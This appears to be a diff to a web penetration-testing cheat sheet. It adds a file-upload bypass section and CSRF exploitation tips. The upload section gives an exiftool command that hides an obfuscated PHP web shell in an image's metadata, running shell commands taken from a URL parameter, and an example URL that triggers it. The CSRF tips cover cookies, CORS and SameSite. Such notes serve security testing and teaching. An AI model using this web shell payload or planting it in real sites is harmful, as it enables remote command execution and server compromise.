@@ -756,6 +756,18 @@ https://github.com/hansmach1ne/lfimap
 ## Path Normalization
 https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
 
+## Unrestricted File Upload Bypasss
+
+### Extension Bypass via metadata  
+1.  
+```
+mv ok.jpeg ok.jpg.php
+exiftool -Comment="<?php $b0=$_GET[base64_decode('b2s=')];if(isset($b0)){echo base64_decode('PHByZT4=').shell_exec($b0).base64_decode('PC9wcmU+');}die();?>" ok.jpg.php
+```
+2.  
+https://site.com/upload/ok.jpg.php?ok=whoami
+
+
 ## SQL Injection
 ### WAF and Filter Bypass
 #### Query default:
@@ -904,6 +916,13 @@ res.send(Exec(req.params.command))
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js
 
 ## CSRF
+### Tricks
+- The session must only contain Cookies or HTTP Basic Authentication header, no other headers must be used to handle the session like a JWT for example.  
+- Cross-Origin Resource Sharing (CORS) - Is used for sharing resources from different origins and allowing servers to specify who can access their assets and which HTTP request methods are allowed from external resources. You must take into account the CORS policy of the victim's website, if GET and POST requests are made from a form and you do not need to read the response the CORS policy will not prevent the attack. However, through other methods such as PUT and DELETE, for example, it will not be possible to make requests using HTML forms;  
+- If the session cookie has the samesite flag, it will not be possible to send it through the attack;  
+- Analysis also other mechanisms that can prevent/difficult your attack like referer, captcha, csrf tokens in parameters or in header.  
+https://rodolfomarianocy.medium.com/metodologia-para-explora%C3%A7%C3%A3o-de-csrf-750f333da4fc	
+	
 e.g.  
 -> csrf.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf.html
